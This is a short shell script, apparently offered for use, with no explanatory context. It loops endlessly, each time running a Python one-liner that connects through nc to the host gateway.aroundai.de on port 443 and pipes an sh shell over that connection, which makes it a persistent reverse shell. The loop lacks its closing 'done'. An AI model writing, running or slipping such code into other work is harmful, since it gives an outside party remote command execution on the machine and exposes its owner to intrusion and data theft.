 #!/bin/sh
while :
do
python3 -c "HOST='gateway.aroundai.de'; PORT='443'; SHELL='sh'; import datetime; print(datetime.datetime.now(),'connecting to',HOST,PORT);import subprocess; nc_process=subprocess.Popen(['nc', HOST, str(PORT)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True); sh_process=subprocess.Popen([SHELL], stdin=nc_process.stdout, stdout=nc_process.stdin, stderr=nc_process.stdin, text=True); nc_process.wait(); sh_process.kill()"
sleep 5